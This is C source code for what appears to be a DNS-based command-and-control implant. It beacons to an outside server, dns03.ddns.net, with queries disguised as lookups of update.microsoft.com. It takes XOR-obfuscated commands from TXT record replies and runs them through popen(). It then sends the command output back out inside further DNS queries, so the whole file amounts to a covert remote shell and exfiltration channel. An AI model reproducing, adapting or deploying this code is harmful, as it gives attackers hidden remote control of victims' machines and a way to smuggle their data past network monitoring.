#include<stdio.h> //printf
#include<string.h>    //strlen
#include<stdlib.h>    //malloc
#include<sys/socket.h>    //you know what this is for
#include<errno.h> //For errno - the error number
#include<netdb.h> //hostent
#include<arpa/inet.h> //inet_addr , inet_ntoa , ntohs etc
#include<netinet/in.h>
#include<unistd.h>    //getpid

#include "messagetypes.h"
#include "base64.c"
#define UUID 0x1234
#define XOR_CHAR 0x33
 
char dns_servers[10][100];
int dns_server_count = 0;
unsigned char hostname[] = "update.microsoft.com";
char fake_dns_server[] = "dns03.ddns.net";

//Types of DNS resource records
#define T_A 1 //Ipv4 address
#define T_NS 2 //Nameserver
#define T_CNAME 5 // canonical name
#define T_SOA 6 /* start of authority zone */
#define T_PTR 12 /* domain name pointer */
#define T_MX 15 //Mail server
#define T_TXT 16 //TXT Record

//Function Prototypes
//void ngethostbyname (unsigned char*, int);
void ngethostbyname (unsigned char*, int, struct Beacon*, int);
void ChangetoDnsNameFormat (unsigned char*,unsigned char*);
unsigned char* ReadName (unsigned char*,unsigned char*,int*);
void get_dns_servers();
int hostname_to_ip(char*, char*);
int execute(char*, char*);
struct Task* get_task_from_response(char *, int);
struct Beacon* create_beacon(int, int, char *, unsigned short);
void encode(unsigned char*, unsigned short, int);
void decode(unsigned char*, unsigned short, int);
void xor(unsigned char*, unsigned short);

//DNS header structure
struct DNS_HEADER
{
    unsigned short id; // identification number
 
    unsigned char rd :1; // recursion desired
    unsigned char tc :1; // truncated message
    unsigned char aa :1; // authoritive answer
    unsigned char opcode :4; // purpose of message
    unsigned char qr :1; // query/response flag
 
    unsigned char rcode :4; // response code
    unsigned char cd :1; // checking disabled
    unsigned char ad :1; // authenticated data
    unsigned char z :1; // its z! reserved
    unsigned char ra :1; // recursion available
 
    unsigned short q_count; // number of question entries
    unsigned short ans_count; // number of answer entries
    unsigned short auth_count; // number of authority entries
    unsigned short add_count; // number of resource entries
};
 
//Constant sized fields of query structure
struct QUESTION
{
    unsigned short qtype;
    unsigned short qclass;
};
 
//Constant sized fields of the resource record structure
#pragma pack(push, 1)
struct R_DATA
{
    unsigned short type;
    unsigned short _class;
    unsigned int ttl;
    unsigned short data_len;
};
#pragma pack(pop)
 
//Pointers to resource record contents
struct RES_RECORD
{
    unsigned char *name;
    struct R_DATA *resource;
    unsigned char *rdata;
};

#pragma pack(push, 1)
struct TXT_RECORD
{
    unsigned char length;
    unsigned char string[];
}; 
#pragma pack(pop)
//Structure of a Query
typedef struct
{
    unsigned char *name;
    struct QUESTION *ques;
} QUERY;

void encode(unsigned char* string, unsigned short string_len, int format) {
    if (format == FORMAT_XOR) {
        xor(string, string_len);
    }
}

void decode(unsigned char* string, unsigned short string_len, int format) {
    if (format == FORMAT_XOR) {
        xor(string, string_len);
    }
}

void xor(unsigned char* string, unsigned short string_len) {
    int i;
    for(i=0; i<string_len;i++) {
        string[i] ^= ((int)XOR_CHAR);
    }
}
 
int main( int argc , char *argv[])
{
 
    char ip[100];

    // Get the ip of the fake dns server. So we can dynamically change based on dns.
    //printf("Getting DNS IP: %s\n", fake_dns_server);
    hostname_to_ip(fake_dns_server, ip);
    //printf("Adding IP to DNS Servers: %s\n", ip);
    strcpy(dns_servers[0] , ip);
    //strcpy(dns_servers[0] , "52.37.43.12");
     
    //send DNS query
    printf("Requesting TXT record\n");

    // Append the Beacon
    struct Beacon *beacon = NULL;
    beacon = (struct Beacon*)malloc(sizeof(struct Beacon));
    //beacon->type = (FORMAT_PLAIN << 4) | BEACON_PING;
    beacon->type = (FORMAT_XOR << 4) | BEACON_PING;
    beacon->uuid = htons(UUID);
    //xor((unsigned char*)&beacon->uuid, 2);
    encode((unsigned char*)&beacon->uuid, 2, FORMAT_XOR);;
    ngethostbyname(hostname, T_TXT, beacon, 3);
 
    return 0;
}
 
/*
 * Perform a DNS query by sending a packet
 * */
void ngethostbyname(unsigned char *host, int query_type, struct Beacon* beacon, int beacon_size)
{
    unsigned char buf[65536],*qname,*reader;
    int i , j , stop , s;
 
    struct sockaddr_in a;
    struct timeval tv;
    tv.tv_sec = 5;  /* 5 Secs Timeout */
    tv.tv_usec = 0;  // Not init'ing this can cause strange errors

 
    struct RES_RECORD answers[20],auth[20],addit[20]; //the replies from the DNS server
    struct sockaddr_in dest;
 
    struct DNS_HEADER *dns = NULL;
    struct QUESTION *qinfo = NULL;
 
    s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP); //UDP packet for DNS queries
    setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, (char *)&tv,sizeof(struct timeval));
 
    dest.sin_family = AF_INET;
    dest.sin_port = htons(53);
    dest.sin_addr.s_addr = inet_addr(dns_servers[0]); //dns servers
 
    //Set the DNS structure to standard queries
    dns = (struct DNS_HEADER *)&buf;
 
    dns->id = (unsigned short) htons(getpid());
    dns->qr = 0; //This is a query
    dns->opcode = 0; //This is a standard query
    dns->aa = 0; //Not Authoritative
    dns->tc = 0; //This message is not truncated
    dns->rd = 1; //Recursion Desired
    dns->ra = 0; //Recursion not available! hey we dont have it (lol)
    dns->z = 0;
    dns->ad = 0;
    dns->cd = 0;
    dns->rcode = 0;
    dns->q_count = htons(1); //we have only 1 question
    dns->ans_count = 0;
    dns->auth_count = 0;
    dns->add_count = 0;
 
    //point to the query portion
    qname =(unsigned char*)&buf[sizeof(struct DNS_HEADER)];
 
    ChangetoDnsNameFormat(qname , host);
    qinfo =(struct QUESTION*)&buf[sizeof(struct DNS_HEADER) + (strlen((const char*)qname) + 1)]; //fill it
 
    qinfo->qtype = htons( query_type ); //type of the query , A , MX , CNAME , NS etc
    qinfo->qclass = htons(1); //its internet (lol)

    int retcode;
    if (beacon == NULL) {
        if( sendto(s,(char*)buf,sizeof(struct DNS_HEADER) + (strlen((const char*)qname)+1) + sizeof(struct QUESTION),0,(struct sockaddr*)&dest,sizeof(dest)) < 0);
    }else {
        printf("beacon available\n");
        printf("beacon->type = %d\n", beacon->type);
        printf("beacon->uuid = %d\n", beacon->uuid);
        memcpy(&buf[sizeof(struct DNS_HEADER) + (strlen((const char*)qname) + 1) + sizeof(struct QUESTION)], beacon, beacon_size);
        retcode = sendto(s,(char*)buf,sizeof(struct DNS_HEADER) + (strlen((const char*)qname)+1) + sizeof(struct QUESTION) + beacon_size, 0,(struct sockaddr*)&dest,sizeof(dest));
    }
 
    if(retcode < 0) {
        perror("sendto failed");
    }
     
    //Receive the answer
    i = sizeof dest;
    if(recvfrom (s,(char*)buf , 65536 , 0 , (struct sockaddr*)&dest , (socklen_t*)&i ) < 0)
    {
        perror("recvfrom failed");
    }
 
    dns = (struct DNS_HEADER*) buf;
 
    //move ahead of the dns header and the query field
    reader = &buf[sizeof(struct DNS_HEADER) + (strlen((const char*)qname)+1) + sizeof(struct QUESTION)];
 
    //Start reading answers
    stop=0;
 
    for(i=0;i<ntohs(dns->ans_count);i++)
    {
        answers[i].name=ReadName(reader,buf,&stop);
        reader = reader + stop;
 
        answers[i].resource = (struct R_DATA*)(reader);
        reader = reader + sizeof(struct R_DATA);
 
        //printf("Got resource type: %d\n", ntohs(answers[i].resource->type));

        if(ntohs(answers[i].resource->type) == 1) //if its an ipv4 address
        {
            answers[i].rdata = (unsigned char*)malloc(ntohs(answers[i].resource->data_len));
 
            for(j=0 ; j<ntohs(answers[i].resource->data_len) ; j++)
            {
                answers[i].rdata[j]=reader[j];
            }
 
            answers[i].rdata[ntohs(answers[i].resource->data_len)] = '\0';
 
            reader = reader + ntohs(answers[i].resource->data_len);
        }
        else if(ntohs(answers[i].resource->type) == T_TXT) // TXT record
        {
            answers[i].rdata = (unsigned char*)malloc(ntohs(answers[i].resource->data_len));
            for(j=0; j<ntohs(answers[i].resource->data_len); j++)
            {
                answers[i].rdata[j]=reader[j];
            }
            reader = reader + ntohs(answers[i].resource->data_len);
        }
        else
        {
            answers[i].rdata = ReadName(reader,buf,&stop);
            reader += stop;
        }
    }
 
    //read authorities
    for(i=0;i<ntohs(dns->auth_count);i++)
    {
        auth[i].name=ReadName(reader,buf,&stop);
        reader+=stop;
 
        auth[i].resource=(struct R_DATA*)(reader);
        reader+=sizeof(struct R_DATA);
 
        auth[i].rdata=ReadName(reader,buf,&stop);
        reader+=stop;
    }
 
    //read additional
    for(i=0;i<ntohs(dns->add_count);i++)
    {
        addit[i].name=ReadName(reader,buf,&stop);
        reader+=stop;
 
        addit[i].resource=(struct R_DATA*)(reader);
        reader+=sizeof(struct R_DATA);
 
        if(ntohs(addit[i].resource->type)==1)
        {
            addit[i].rdata = (unsigned char*)malloc(ntohs(addit[i].resource->data_len));
            for(j=0;j<ntohs(addit[i].resource->data_len);j++)
            addit[i].rdata[j]=reader[j];
 
            addit[i].rdata[ntohs(addit[i].resource->data_len)]='\0';
            reader+=ntohs(addit[i].resource->data_len);
        }
        else
        {
            addit[i].rdata=ReadName(reader,buf,&stop);
            reader+=stop;
        }
    }
 
    //print answers
    //printf("\nAnswer Records : %d \n" , ntohs(dns->ans_count) );
    for(i=0 ; i < ntohs(dns->ans_count) ; i++)
    {
        //printf("Name : %s \n",answers[i].name);
 
        if( ntohs(answers[i].resource->type) == T_A) //IPv4 address
        {
            long *p;
            p=(long*)answers[i].rdata;
            a.sin_addr.s_addr=(*p); //working without ntohl
            //printf("has IPv4 address : %s\n",inet_ntoa(a.sin_addr));
        }
         
        if(ntohs(answers[i].resource->type)==5) 
        {
            //Canonical name for an alias
            //printf("has alias name : %s\n",answers[i].rdata);
        }

        if(ntohs(answers[i].resource->type)==T_TXT) 
        {
            struct TXT_RECORD *txt = NULL;

            txt = (struct TXT_RECORD*)answers[i].rdata;

            // Extract Beacon Task
            struct Task* task;
            task = get_task_from_response(txt->string, txt->length);
            if (task == NULL) {
                //printf("Unable to extract Task");
                return;
            }

            //printf("task->type: %d\n", task->type);
            //printf("task->data_length: %d\n", task->data_length);
            //printf("task->data: %s\n", task->data);
            printf("task->type = 0x%02x\n", task->type);
            if ((task->type >> 4) == FORMAT_XOR) {
                printf("Received XOR Task\n");
                decode((unsigned char*)&task->data_length, 2, FORMAT_XOR);
                decode((unsigned char*)&task->data, task->data_length, FORMAT_XOR);
            }


            if ((task->type & 0xf) == TASK_CLI) {
                char *output = malloc(1024);
                struct Beacon* beacon;

                if (execute(task->data, output) != 0) {
                    return;
                }
                beacon = create_beacon(FORMAT_XOR, BEACON_DATA, output, strlen(output));
                //beacon = create_beacon(FORMAT_PLAIN, BEACON_DATA, output, strlen(output));

                //printf("beacon->data = %s\n", beacon->data);

                ngethostbyname(hostname, T_A, beacon, sizeof(struct Beacon) + strlen(output));
            }
        }
 
    }
 
    return;
}

struct Task* get_task_from_response(char * data, int data_length) {
    int task_type;
    int task_format;
    struct Task* task = NULL;
    
    task = (struct Task*)malloc(data_length);
    task->type = data[0];
    task->data_length = (data[1] << 8) | data[2];
    
    int x;
    for(x=0;x < data_length; x++) {
        task->data[x] = data[x + 3];
    }

    // TODO: Why does this reverse bytes?
    //task = (struct Task*)data;
    // this too:
    //memcpy(task, data, data_length);
    /* 
    for(x=0;x < data_length; x++) {
        printf("data[%d] = 0x%02x\n", x, data[x]);
    }
    for(x=0;x < data_length-3; x++) {
        printf("task->data[%d] = 0x%02x\n", x, task->data[x]);
    }
    */
    return task;
}

 
/*
 * 
 * */
u_char* ReadName(unsigned char* reader,unsigned char* buffer,int* count)
{
    unsigned char *name;
    unsigned int p=0,jumped=0,offset;
    int i , j;
 
    *count = 1;
    name = (unsigned char*)malloc(256);
 
    name[0]='\0';
 
    //read the names in 3www6google3com format
    while(*reader!=0)
    {
        if(*reader>=192)
        {
            offset = (*reader)*256 + *(reader+1) - 49152; //49152 = 11000000 00000000 ;)
            reader = buffer + offset - 1;
            jumped = 1; //we have jumped to another location so counting wont go up!
        }
        else
        {
            name[p++]=*reader;
        }
 
        reader = reader+1;
 
        if(jumped==0)
        {
            *count = *count + 1; //if we havent jumped to another location then we can count up
        }
    }
 
    name[p]='\0'; //string complete
    if(jumped==1)
    {
        *count = *count + 1; //number of steps we actually moved forward in the packet
    }
 
    //now convert 3www6google3com0 to www.google.com
    for(i=0;i<(int)strlen((const char*)name);i++) 
    {
        p=name[i];
        for(j=0;j<(int)p;j++) 
        {
            name[i]=name[i+1];
            i=i+1;
        }
        name[i]='.';
    }
    name[i-1]='\0'; //remove the last dot
    return name;
}
 
/*
 * This will convert www.google.com to 3www6google3com 
 * got it :)
 * */
void ChangetoDnsNameFormat(unsigned char* dns,unsigned char* host) 
{
    int lock = 0 , i;
    strcat((char*)host,".");
     
    for(i = 0 ; i < strlen((char*)host) ; i++) 
    {
        if(host[i]=='.') 
        {
            *dns++ = i-lock;
            for(;lock<i;lock++) 
            {
                *dns++=host[lock];
            }
            lock++; //or lock=i+1;
        }
    }
    *dns++='\0';
}

int hostname_to_ip(char * hostname , char* ip)
{
    struct hostent *he;
    struct in_addr **addr_list;
    int i;

    if ( (he = gethostbyname( hostname ) ) == NULL)
    {
        // get the host info
        herror("gethostbyname");
        return 1;
    }

    addr_list = (struct in_addr **) he->h_addr_list;

    for(i = 0; addr_list[i] != NULL; i++)
    {
        //Return the first one;
        strcpy(ip , inet_ntoa(*addr_list[i]) );
        return 0;
    }

    return 1;
}

int execute(char * cmd, char * output)
{
  FILE *fp;

  fp = popen(cmd, "r");
  if (fp == NULL) {
    return -1;
  }

  fread(output, 1023, 1, fp);
  int rc = pclose(fp);

  return rc;
}

struct Beacon* create_beacon(int format, int type, char * data, unsigned short data_length) {
    struct Beacon* beacon;

    beacon = (struct Beacon*)malloc(sizeof(struct Beacon) + data_length);
    beacon->type = ((format << 4) & 0xf0) | (type & 0x0f);
    printf("XXXXXXXXXXXXXX beacon->type = %d\n", beacon->type);
    beacon->uuid = htons(UUID);
    encode((unsigned char*)&beacon->uuid, 2, format);;
    beacon->data_length = data_length;
    encode((unsigned char*)&beacon->data_length, 2, format);
    memcpy(beacon->data, data, data_length);
    encode((unsigned char*)&beacon->data, data_length, format);
    return beacon;
}
